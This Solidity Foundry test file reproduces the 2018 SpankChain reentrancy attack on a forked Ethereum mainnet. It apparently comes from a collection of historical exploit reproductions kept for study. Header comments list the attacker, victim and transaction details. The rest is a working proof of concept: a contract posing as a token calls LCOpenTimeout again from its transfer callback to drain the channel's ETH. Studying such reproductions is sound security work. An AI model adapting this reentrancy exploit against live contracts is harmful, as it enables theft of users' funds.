// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~36k USD
//   - 165 ETH
// Vulnerability Type : Reentrancy
// Attacked At : Mainnet, block height 6467246, 2018-10-07T00:39:09Z
// Attacker : 0xcf267eA3f1ebae3C29feA0A3253F94F3122C2199
// Exploit Contract :
//   - 0xaaaD8d7AE50d5dd6fFA9d29A2531ab2a67803A1f
//   - 0xc5918a927C4FB83FE99E30d6F66707F4b396900E
// Revenue Address : 0xcf267eA3f1ebae3C29feA0A3253F94F3122C2199
// Victim Contract : 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7
// Vulnerable Snippet : https://etherscan.io/address/0xf91546835f756da0c10cfa0cda95b15577b84aa7#code#L416
// Attack Txs :
//   - 0xd8d5a14f57925db1b745e2b4427c4fc1d5a59587a6c9288c3b772d7533a68876 (+0.29 ETH, height 6472826, T+21h27m37s)
//   - 0xf120b79aa0af659d23b9824f6a68c8ccfb63cfd63b5e45f8658cee558935b45d (+1.32 ETH, height 6471261, T+15h30m57s)
//   - 0x41af661b529967c83dd61e489a0a0728378fb74a961f15b2c800637fe332c6bc (+0.76 ETH, height 6468208, T+3h41m53s)
//   - 0x2228e2ac9fe71f517eec12e4d9d68217c725ef21bb407c82d1dda00709137ac1 (+1.1 ETH, height 6467270, T+5m27s)
//   - 0xf95e87181d4f0ca831c15e3f401818d06b7c3a281fbccd9544a4669133078099 (+6.5 ETH, height 6467258, T+2m42s)
//   - 0x21e9d20b57f6ae60dac23466c8395d47f42dc24628e5a31f224567a2b4effa88 (+155 ETH, height 6467248, T+21s)
//   - 0x84033e0c908cab415359b5a1a54289a533b20b8450836ceb13190848c2aac6a8 (+0.4 ETH, height 6467246, T)
//
// @Ref
// Official : https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe
// Connext : https://medium.com/connext/transparency-report-64c9e58e0a19
// Zhongqiang Chen : https://medium.com/@zhongqiangc/smart-contract-reentrancy-ledger-channel-e894fe647781

contract Attacker is Test {
    /**
     * @dev In this PoC, we reproduced transaction 0x21e9d20b57f6ae60dac23466c8395d47f42dc24628e5a31f224567a2b4effa88.
     * @dev The other attack transactions follow the same logic, differing only in the calldata.
     */

    Exploit exploit;

    function setUp() public {
        vm.createSelectFork("mainnet", 6_467_247);
        vm.deal(address(this), 5 ether);
        exploit = new Exploit();
    }

    function testExploit() public {
        console.log("[Before Attack] address(this).balance = %18e ethers", address(this).balance);
        exploit.exploit{value: 5 ether}(32);
        console.log("[After Attack] address(this).balance = %18e ethers", address(this).balance);
    }
    
    receive() external payable {}
}

contract Exploit {
    ILedgerChannel private constant ledgerChannel = ILedgerChannel(0xf91546835f756DA0c10cFa0CDA95b15577b84aA7);

    bytes32 private constant _lcID = keccak256("abc");

    uint256 private count = 1;
    uint256 private limit;

    function exploit(uint256 amount) public payable {
        limit = amount;

        address _partyI = msg.sender;
        uint256 _confirmTime = type(uint256).max - block.timestamp + 1;
        address _token = address(this);
        uint256[2] memory _balances;
        _balances[0] = msg.value;
        _balances[1] = 1;

        ledgerChannel.createChannel{value: msg.value}(_lcID, _partyI, _confirmTime, _token, _balances);

        ledgerChannel.LCOpenTimeout(_lcID);

        payable(msg.sender).transfer(address(this).balance);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        if (count < limit) {
            count += 1;
            ledgerChannel.LCOpenTimeout(_lcID);
        }
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public pure returns (bool)  {
        return true;
    }

    receive() external payable {}
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------

// Shortened interface, removed unused methods.
interface ILedgerChannel {
    function createChannel(
        bytes32 _lcID,
        address _partyI,
        uint256 _confirmTime,
        address _token,
        uint256[2] memory _balances
    ) external payable;
    
    function LCOpenTimeout(bytes32 _lcID) external;
}
